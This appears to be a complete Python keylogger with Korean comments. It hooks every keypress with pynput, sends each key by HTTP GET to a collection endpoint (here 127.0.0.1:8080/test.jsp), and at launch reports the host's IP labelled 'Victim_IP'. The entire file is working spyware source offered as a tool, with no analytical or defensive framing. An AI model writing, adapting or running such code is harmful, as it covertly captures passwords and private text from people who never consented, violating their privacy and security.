import threading
import requests
import socket
from pynput.keyboard import Listener

def get_ip_address():
    try:
        # 호스트 이름을 가져와서 IP 주소를 얻음
        host_name = socket.gethostname()
        ip_address = socket.gethostbyname(host_name)
        return ip_address
    except socket.error as e:
        return None


def send_log(key):
    # 내용을 전송하기 위한 HTTP GET 요청
    try:
        response = requests.get("http://127.0.0.1:8080/test.jsp", params={"data": key})
        if response.status_code == 200:
            # 로그가 성공적으로 전송되면 log.txt 파일 초기화
            open("log.txt", "w").close()
        else:
            pass
    except requests.RequestException as e:
        pass

def keystorkes(key):
    key = str(key).replace("'", "")

    if key == "Key.space":
        key = " "
    if key == "Key.shift_r":
        key = ""
    if key == "Key.enter":
        key = "\n"

    send_log(key)



# IP 주소 출력
ip_address = get_ip_address()
if ip_address:
        response = requests.get("http://127.0.0.1:8080/test.jsp", params={"data": '[!] Victim_IP: '+ip_address})



with Listener(on_press = keystorkes) as l:
    l.join()
